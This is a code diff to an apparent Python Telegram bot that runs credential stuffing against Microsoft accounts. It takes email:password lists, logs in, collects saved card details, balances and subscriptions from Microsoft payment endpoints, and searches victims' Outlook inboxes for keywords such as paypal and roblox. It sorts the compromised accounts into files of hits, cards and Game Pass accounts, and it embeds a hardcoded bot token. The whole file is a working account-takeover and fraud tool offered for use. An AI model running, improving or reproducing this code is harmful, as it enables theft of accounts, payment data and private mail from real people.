@@ -8,6 +8,8 @@ import time
 import zipfile
 import shutil
 import uuid
+import imaplib
+import ssl
 from urllib.parse import urlparse, parse_qs, quote
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types, F
@@ -21,7 +23,7 @@ from aiogram.client.default import DefaultBotProperties
 # ============================================================
 BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
 ADMIN_IDS = [7595790309]
-MAX_CONCURRENT = 5 # Lowered heavily for heavy API requests
+MAX_CONCURRENT = 10
 TIMEOUT = 25
 TEMP_DIR = "./temp"
 
@@ -51,7 +53,7 @@ def parse_lr(text: str, left: str, right: str) -> str:
         return ""
 
 # ============================================================
-# FLOW 1: SFTAG WEB LOGIN & PAYMENT API (Xbox/Cards/Subs)
+# FLOW 1: SFTAG WEB LOGIN & PAYMENT API
 # ============================================================
 async def sftag_login(session, email, password):
     headers = {"User-Agent": UA_EDGE}
@@ -97,43 +99,46 @@ async def get_pifd_atk(session):
 
 async def get_payment_data(session, atk):
     headers = {"User-Agent": UA_EDGE, "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
-    cards = []
-    country = "Unknown"
-    balance = ""
-    subs = []
+    cards, subs, country, balance = [], [], "Unknown", ""
 
-    # 1. Payment Instruments (Cards & Country)
+    # 1. Cards & Country
     try:
         url1 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
         async with session.get(url1, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
-                body = await r.text()
-                cc = parse_lr(body, '"country":"', '"')
-                if cc: country = cc.upper()
-                bal = parse_lr(body, 'balance":', ',"')
-                if bal: balance = bal.strip().strip('"')
-                
                 data = await r.json()
+                cc = data.get("country") or data.get("countryCode")
+                if cc: country = cc.upper()
+                bal = data.get("balance")
+                if bal: balance = str(bal)
+                
                 for item in data.get("items", data.get("paymentInstruments", [])):
                     last4 = item.get("lastFourDigits", "")
                     if last4:
                         cards.append(f"{item.get('paymentMethodFamily', 'CC')} *{last4} ({item.get('expiryMonth', '')}/{item.get('expiryYear', '')})")
     except: pass
 
-    # 2. Transactions (Subscriptions & GamePass)
+    # 2. Subs
     try:
         url2 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
         async with session.get(url2, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 data = await r.json()
                 for sub in data.get("subscriptions", []):
-                    subs.append(f"{sub.get('title', 'Sub')} ({sub.get('totalAmount', '')} {sub.get('currency', '')})")
+                    title = sub.get('title', 'Subscription')
+                    price = ""
+                    billing = sub.get('billingDetails', {})
+                    if billing:
+                        amt = billing.get('totalAmount', '')
+                        cur = billing.get('currency', '')
+                        if amt and cur: price = f"({amt} {cur})"
+                    subs.append(f"{title} {price}".strip())
     except: pass
 
     return {"cards": cards, "country": country, "balance": balance, "subs": subs}
 
 # ============================================================
-# FLOW 2: OUTLOOK OAUTH & SUBSTRATE (Inbox Search)
+# FLOW 2: OUTLOOK OAUTH & SUBSTRATE
 # ============================================================
 async def outlook_login(session, email, password):
     url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id={OUTLOOK_CLIENT_ID}&scope={quote(OUTLOOK_SCOPE)}&redirect_uri={quote(OUTLOOK_REDIRECT)}"
@@ -168,8 +173,6 @@ async def outlook_login(session, email, password):
 async def search_outlook(session, atk, cid, email, keywords):
     headers = {"Authorization": f"Bearer {atk}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0", "Content-Type": "application/json"}
     hits = {}
-    
-    # Get Region
     region = "Unknown"
     try:
         async with session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
@@ -178,7 +181,6 @@ async def search_outlook(session, atk, cid, email, keywords):
                 region = data.get("location", "Unknown").upper()
     except: pass
 
-    # Search Keywords
     for kw in keywords:
         query = f"from:{kw}" if "@" in kw else kw
         payload = {
@@ -192,7 +194,6 @@ async def search_outlook(session, atk, cid, email, keywords):
                     data = await r.json()
                     total = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                     if total > 0:
-                        # Try to extract Roblox username if Roblox keyword is found
                         raw = json.dumps(data)
                         uname = "Unknown"
                         if "roblox" in kw.lower():
@@ -200,7 +201,6 @@ async def search_outlook(session, atk, cid, email, keywords):
                             if m: uname = m.group(1)
                         hits[kw] = {"count": total, "extra": uname}
         except: pass
-        
     return {"region": region, "hits": hits}
 
 # ============================================================
@@ -209,21 +209,16 @@ async def search_outlook(session, atk, cid, email, keywords):
 async def check_account(session, email, password, keywords):
     res = {"email": email, "pw": password, "status": "bad", "region": "Unknown", "cards": [], "subs": [], "hits": {}, "roblox": "N/A"}
     
-    # 1. Web Login (SFTAG) -> Payment & Xbox
     jar = aiohttp.CookieJar(unsafe=True)
     async with aiohttp.ClientSession(cookie_jar=jar) as sftag_session:
         login_res = await sftag_login(sftag_session, email, password)
-        if login_res == "bad":
-            return res
+        if login_res == "bad": return res
         if login_res == "2fa":
             res["status"] = "2fa"
             return res
-        if not login_res:
-            return res
+        if not login_res: return res
             
         res["status"] = "valid"
-        
-        # Get PIFD ATK & Payment Data
         atk = await get_pifd_atk(sftag_session)
         if atk:
             pay_data = await get_payment_data(sftag_session, atk)
@@ -231,7 +226,6 @@ async def check_account(session, email, password, keywords):
             res["cards"] = pay_data["cards"]
             res["subs"] = pay_data["subs"]
             
-    # 2. Outlook OAuth -> Inbox Search (if keywords provided)
     if keywords:
         async with aiohttp.ClientSession() as out_session:
             out_login = await outlook_login(out_session, email, password)
@@ -243,7 +237,6 @@ async def check_account(session, email, password, keywords):
                 for kw, data in out_data["hits"].items():
                     if "roblox" in kw.lower() and data["extra"] != "Unknown":
                         res["roblox"] = data["extra"]
-
     return res
 
 # ============================================================
@@ -268,7 +261,7 @@ async def process_combos(combos, keywords, chat_id, status_msg, bot):
                 tfa = sum(1 for x in results if x["status"] == "2fa")
                 elapsed = now - t_start
                 try:
-                    await status_msg.edit_text(f"<b>Master Checker...</b>\nprogress: <code>{done}/{total}</code>\nvalid: <b>{hits}</b> | 2fa: <b>{tfa}</b>\nbad: <b>{bad}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code> | {elapsed:.1f}s", parse_mode=ParseMode.HTML)
+                    await status_msg.edit_text(f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\nvalid: <b>{hits}</b> | 2fa: <b>{tfa}</b>\nbad: <b>{bad}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code>", parse_mode=ParseMode.HTML)
                 except: pass
         await asyncio.gather(*(worker(e, p) for e, p in combos))
 
@@ -282,13 +275,11 @@ async def process_combos(combos, keywords, chat_id, status_msg, bot):
     def write_file(name, lines):
         with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))
 
-    # Generate rich output matching all script formats
     rich_valid = []
     for r in valid:
         card_str = ", ".join(r["cards"]) if r["cards"] else "None"
         sub_str = ", ".join(r["subs"]) if r["subs"] else "None"
         hit_str = ", ".join(f"{k}({v['count']})" for k, v in r["hits"].items()) if r["hits"] else ""
-        
         line = f"{r['email']}:{r['pw']} | Region: {r['region']} | Cards: [{card_str}] | Subs: [{sub_str}]"
         if hit_str: line += f" | Hits: [{hit_str}]"
         if r["roblox"] != "N/A": line += f" | Roblox: {r['roblox']}"
@@ -299,11 +290,9 @@ async def process_combos(combos, keywords, chat_id, status_msg, bot):
     write_file("invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
     write_file("2fa.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
     
-    # GamePass specifically
     gp = [f"{r['email']}:{r['pw']} | {', '.join(r['subs'])}" for r in valid if any("pass" in s.lower() for s in r["subs"])]
     if gp: write_file("gamepass.txt", gp)
     
-    # Cards specifically
     cc = [f"{r['email']}:{r['pw']} | {', '.join(r['cards'])}" for r in valid if r["cards"]]
     if cc: write_file("cards.txt", cc)
 
@@ -328,7 +317,7 @@ dp = Dispatcher()
 @dp.message(Command("start"))
 async def cmd_start(msg: types.Message):
     if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return await msg.answer("not authorized.")
-    await msg.answer("<b>master checker</b>\n\nsend a .txt file with <code>email:password</code>\nreply to it with <code>/kw paypal, roblox</code> to search inbox.")
+    await msg.answer("<b>checker</b>\n\nsend a .txt file with <code>email:password</code>\nreply with <code>/kw roblox, paypal</code> for inbox.")
 
 @dp.message(F.document)
 async def handle_file(msg: types.Message):
